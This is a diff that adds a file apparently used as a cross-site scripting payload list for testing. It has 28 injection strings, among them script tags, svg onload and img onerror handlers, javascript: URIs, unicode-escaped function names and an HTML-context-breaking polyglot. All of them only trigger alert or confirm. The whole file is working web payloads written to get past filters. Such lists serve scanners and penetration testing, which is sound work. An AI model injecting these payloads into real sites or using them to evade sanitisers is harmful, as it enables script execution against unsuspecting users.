@@ -1,0 +1,28 @@
+<script>alert(1)</script>
+<svg onload="alert(1)"/>
+alert(1)
+javascript:alert(1)
+<img src=1 onerror=alert(1)>
+"><svg onload=alert()>
+"><svg onload=alert()><b attr="
+'-alert()-'
+'-alert()//'
+'}alert(1);{'
+'}%0Aalert(1);%0A{'
+</script><svg onload=alert()>
+confirm()
+confirm``
+(confirm``)
+{confirm``}
+[confirm``]
+(((confirm)))``
+co\u006efirm()
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+<d3"<"/onclick="1>[confirm``]"<">z
+<details open ontoggle=alert()>
+<svg/onload=confirm()>
+<iframe/src=javascript:alert(1)>
+<script>confirm()</script>
+<svg onload=confirm()//
+<svg onload=z=co\u006efir\u006d,z()>
+<object data=javascript:confirm()>
